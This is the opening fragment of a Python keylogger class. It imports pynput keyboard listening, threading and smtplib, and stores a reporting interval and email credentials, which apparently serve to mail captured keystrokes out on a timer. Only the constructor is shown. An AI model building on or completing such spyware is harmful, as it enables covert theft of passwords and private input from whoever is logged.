from pynput import keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time, email, password):
        self.log = "[+] Keylogger has started"
        self.time_interval = time
        self.email = email
        self.password = password
